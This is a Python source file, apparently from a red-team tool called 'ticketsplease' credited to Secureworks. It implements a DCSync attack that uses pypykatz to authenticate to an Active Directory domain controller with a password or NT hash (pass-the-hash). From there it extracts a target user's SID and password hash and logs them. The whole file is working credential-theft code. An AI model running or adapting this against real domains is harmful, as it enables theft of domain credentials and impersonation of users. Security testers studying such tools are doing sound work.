# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import logging
import asyncio
from typing import Tuple
from pypykatz.smb.dcsync import dcsync  # type: ignore
from ticketsplease.core import gen_nt_hash


class DCSYNC:
    """DCSync to retrieve target user secretes (hash / SID)"""

    async def _dc_sync(
        self,
        url: str,
        user: str,
    ) -> str:
        """Perform DCSync using the PyPykatz module.

        Arguments:
            url: SMB DC URL for DCSync
            user: user to pull secrets for

        Yields:
            specified user's secrets
        """
        async for secret in dcsync(url, user):
            await asyncio.sleep(1)
            yield secret

    @classmethod
    async def run(
        cls,
        dc_ip: str,
        domain: str,
        target_user: str,
        username: str,
        password: str = None,
        hash: str = None,
    ) -> Tuple[str, str]:
        """Using the provided username and hash, perform a DCSync to retrieve the SID
        and hash of the target user.
        Publicly accessible class method to execute DCSync.

        Arguments:
            dc_ip: target dc to sync with
            domain: target domain
            target_user: target user to extract secrets
            username: username to perform dcsync auth
            password: password for user to perform dcsync auth
            hash: hash for user to perform dcsync auth

        Returns:
            tuple of SID and hash for a given ADFS user

        Raises:
            ValueError: if password and ntHash are omitted
        """
        if not hash and not password:
            raise ValueError("password or NT hash required for DCSync")

        logging.info(f"[ * ] Running DCSync against the Domain Controller: '{dc_ip}'")

        if password and not hash:
            hash = gen_nt_hash(password)

        smb_url = f"smb2+ntlm-nt://{domain}\\{username}:{hash}@{dc_ip}"

        # Run DCSync and add the secret on completion
        list_ = []
        async for secret in cls._dc_sync(cls, smb_url, target_user):
            list_.append(secret)

        # Parse the secret for SID and hash
        sid, hash = "", ""
        for secret in list_:
            secret = str(secret).split(":")
            sid = secret[4]
            hash = secret[6]

        logging.info(f"[ + ] {target_user} Password Hash: {hash}")
        logging.info(f"[ + ] {target_user} SID:           {sid}")

        return (sid, hash)
